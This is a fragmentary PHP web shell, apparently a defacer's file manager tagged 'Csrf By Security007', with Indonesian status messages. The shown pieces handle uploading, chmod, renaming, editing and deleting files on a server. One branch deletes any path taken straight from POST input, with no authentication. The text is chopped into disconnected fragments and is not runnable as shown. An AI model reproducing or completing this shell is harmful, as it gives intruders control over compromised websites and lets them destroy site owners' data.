...
<body>
<h1><tt><center><font color="blue">cinta<br>| [ cinta] |<br></font></center></h1></tt>
...
echo '<font color="red">Asu Upload Gagal</font><br/>';
}
}
...
<center><br><br><br><br>
<font color=silver>Csrf By Security007
<center>
<form method="post">
...
echo '<font color="red">Asu Ubah Permission Gagal</font><br />';
}
}
echo '<form method="POST">
...
echo '<font color="red">Asu Ganti Nama Gagal</font><br />';
}
...
echo '<font color="red">Asu Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
...
echo '<font color="red">Asu Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Horee File Terhapus</font><br/>';
}else{
echo '<font color="red">Asu File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
